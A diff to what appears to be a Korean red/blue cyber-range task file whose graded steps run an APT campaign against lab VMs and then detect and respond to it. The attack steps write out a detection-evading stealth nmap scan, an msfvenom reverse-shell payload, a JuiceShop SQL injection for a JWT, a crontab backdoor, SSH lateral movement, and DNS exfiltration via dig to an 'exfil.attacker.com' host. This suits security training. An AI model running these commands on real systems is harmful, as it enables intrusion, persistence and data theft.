@@ -38,20 +38,22 @@ steps:
     type: output_contains
     expect: open
     semantic:
-      intent: '[RED] APT 캠페인 시뮬레이션 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] APT Phase 1 스텔스 정찰 — nmap -sS -T2 --max-scan-delay 1s -f --data-length 30 -p 22,80,443,3000
+        10.20.30.0/24. -T2 polite + --max-scan-delay 로 분당 ~30 패킷 이하 + -f 프래그멘트 + --data-length 30 시그니처
+        변조. w6 s2 의 커스텀 룰(threshold 20/5s) 임계 이하 유지 → 탐지 회피'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - -T2 또는 --max-scan-delay
+      - -f 프래그멘트 또는 --data-length
+      - threshold 이하 페이스 유지
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - nmap -T2 -f --data-length
+      - masscan --rate 1
+      - 수동 nc 단발
+      - shodan 으로 passive
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - -T4/-T5 (탐지됨)
+      - 단일 옵션만
+      - 스텔스 개념 없음
   target_vm: attacker
   script: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s 10.20.30.80 -oX /tmp/apt_campaign_recon.xml
     2>&1 | tail -15 && nmap --script http-enum -p 80,3000,8080 --max-retries 1 --host-timeout 15s -T4
@@ -78,20 +80,21 @@ steps:
     type: output_contains
     expect: token
     semantic:
-      intent: '[RED] APT 캠페인 시뮬레이션 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] APT Phase 2 Initial Access — msfvenom -p linux/x64/shell_reverse_tcp LHOST LPORT
+        -f elf -o /tmp/apt_payload.elf (저장만, 실행 없음) + curl POST /rest/user/login SQLi 로 JWT 획득 → /api/Users
+        접근. 페이로드 weaponize + SQLi 로 초기 접근 교두보. MITRE TA0001 Initial Access'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - msfvenom payload 생성 (실행 없음)
+      - JuiceShop SQLi + JWT 획득
+      - Initial Access 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - msfvenom -f elf + SQLi
+      - sqlmap 자동화
+      - Burp Intruder
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - payload 실제 실행
+      - SQLi 없이 페이로드만
+      - TA0001 매핑 없음
   target_vm: attacker
   script: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/apt_campaign_payload.elf
     2>&1 | tail -3 && echo ''--- SQLi Initial Access ---'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
@@ -119,20 +122,21 @@ steps:
     type: output_contains
     expect: APT_CAMPAIGN
     semantic:
-      intent: '[RED] APT 캠페인 시뮬레이션 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] APT Phase 3 Persistence + Lateral Movement — (crontab -l; echo */5 * * * * echo APT-test
+        >> /tmp/.apt_bd) | crontab - (5분 주기 백도어 시뮬레이션) + ssh ccc@secu hostname && id (내부 서버 측면 이동) + ssh
+        ccc@web uname -a (다른 서버). 지속성 + 측면 이동 combo. TA0003 Persistence + TA0008 Lateral Movement'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - crontab 백도어 설치
+      - 내부 서버(secu/web) SSH 이동
+      - Persistence + Lateral 복합
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - crontab + ssh 중첩 접속
+      - systemd service 대체
+      - SSH ProxyJump
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - Persistence 또는 Lateral 하나만
+      - 실제 파괴적 명령
+      - TA0003/TA0008 매핑 없음
   target_vm: attacker
   script: echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab - && crontab -l
     && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1
@@ -161,20 +165,21 @@ steps:
     type: output_contains
     expect: APT Campaign Detection
     semantic:
-      intent: '[BLUE] APT 캠페인 시뮬레이션 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] 진행 중 APT 캠페인 탐지 — tail /var/log/suricata/fast.log + tail /var/log/auth.log (SSH
+        이동) + crontab -l + diff <(현재 crontab) <(/tmp/crontab_baseline) 교차 분석. APT 는 단일 소스로 놓치기 쉬움 → 네트워크(Suricata)
+        + 인증(auth) + 지속성(crontab) 3 소스 상관'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 3개 소스 교차 분석 (Suricata + auth + crontab)
+      - crontab 변경 diff
+      - APT 맥락 종합 분석
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - tail + diff + jq
+      - Wazuh 통합 뷰
+      - Sigma rule 다중 소스
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1-2개 소스만
+      - diff 없이 현재 상태만
+      - APT 맥락 없음
   target_vm: secu
   script: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" && ssh 10.20.30.1 "tail
     -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'',''))
@@ -205,20 +210,21 @@ steps:
     type: output_contains
     expect: APT CAMPAIGN
     semantic:
-      intent: '[BLUE] APT 캠페인 시뮬레이션 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] 탐지 Gap 해소 룰 추가 — Wazuh correlation: APT 캠페인 signature (여러 Technique 매칭 시) + Suricata
+        커스텀: APT stealth 스캔 탐지 (threshold 낮춤 5/30s · -f 프래그멘트 탐지 reassembly). s1 의 스텔스 스캔이 s4 에서 놓쳐진 원인
+        해소. 반복적 tuning process'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - Wazuh correlation + Suricata 커스텀 룰
+      - s1 스텔스 스캔 검출 가능
+      - 반복 tuning 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - local_rules.xml 편집 + /etc/suricata/rules/local.rules
+      - Sigma → Elastic 변환
+      - Zeek notice.log 조정
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 기존 룰 재사용만
+      - Gap 분석 없음
+      - tuning 반복 없음
   target_vm: siem
   script: 'cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign correlation <group name="apt_campaign">
     <rule id="100400" level="15" frequency="4" timeframe="600"> <if_matched_group>apt_campaign_indicator</if_matched_group>
@@ -247,20 +253,22 @@ steps:
     type: output_contains
     expect: active-response
     semantic:
-      intent: '[BLUE] APT 캠페인 시뮬레이션 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] APT 감지 시 Wazuh Active Response 자동 격리 — ossec.conf <active-response><command>firewall-drop</command>
+        + custom command (kill process·disable user·isolate host). APT 특화 rule (level 12+ composite) 매칭
+        시 연쇄 자동 대응. 복합 격리 (단순 IP 차단 이상)'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - ossec.conf APT 전용 Active Response
+      - firewall-drop + custom 명령
+      - 복합 격리 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - ossec.conf + custom script
+      - Wazuh active-response/bin/ 스크립트
+      - Shuffle workflow
+      - TheHive Cortex responder
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - firewall-drop 단독만
+      - APT 특화 아님
+      - 복합 격리 없음
   target_vm: siem
   script: cat > /tmp/apt_active_response.xml << 'EOF' <ossec_config> <active-response> <command>firewall-drop</command>
     <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response> <active-response>
@@ -284,20 +292,21 @@ steps:
     type: output_contains
     expect: DNS Exfiltration
     semantic:
-      intent: '[RED] APT 캠페인 시뮬레이션 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] APT Phase 4 데이터 유출 시뮬레이션 — uname -a + hostname + ip addr (시스템 정보 수집) | base64 → 63바이트
+        분할 → dig TXT <chunk>.exfil.attacker.com 반복. 수집한 정보를 DNS 를 통해 은밀히 외부 전송. 최종 킬체인 단계. MITRE T1048.003
+        DNS Exfiltration'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - uname/hostname/ip 정보 수집
+      - base64 + DNS 쿼리 embedding
+      - T1048.003 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - bash pipeline + dig
+      - python + dnspython
+      - iodine/dnscat2 실제 도구
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 정보 수집 없이 DNS 만
+      - 평문 전송
+      - Exfiltration 맥락 없음
   target_vm: attacker
   script: cat /etc/hostname > /tmp/apt_staging.txt && id >> /tmp/apt_staging.txt && echo "=== DNS Exfiltration
     Attempt ===" && head -2 /tmp/apt_staging.txt | base64 | tr -d "\n" | head -c 50 | xargs -I{} echo
@@ -338,20 +347,22 @@ steps:
     type: output_contains
     expect: APT Campaign Simulation
     semantic:
-      intent: '[RED/BLUE] APT 캠페인 시뮬레이션 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] APT 캠페인 Kill Chain 보고서 /tmp/apt_campaign_report.txt — 공격 타임라인 (Phase 1~4 시각·성공
+        여부) + 탐지 커버리지 (각 Phase 에서 Blue 탐지 여부·Gap 위치) + 개선 권고 (정찰 탐지·DNS 모니터·crontab baseline) + MITRE
+        ATT&CK Navigator layer JSON. 환경 정리 (crontab -r · payload 삭제 · baseline 복원)'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/apt_campaign_report.txt 보고서
+      - Phase 1-4 타임라인 + 탐지 결과
+      - Gap + 개선 권고
+      - ATT&CK 매핑 + 정리
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 4 Phase 표
+      - MITRE ATT&CK Navigator JSON
+      - Threat Report Scoring Model
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - Phase 구분 없음
+      - Gap 분석 없음
+      - 정리 누락
   target_vm: attacker
   script: 'crontab -r 2>/dev/null; rm -f /tmp/apt_campaign_*.elf /tmp/apt_campaign_*.xml /tmp/apt_staging.txt
     /tmp/apt_beacon.txt 2>/dev/null && cat > /tmp/apt_campaign_report.txt << ''EOF'' === APT Campaign
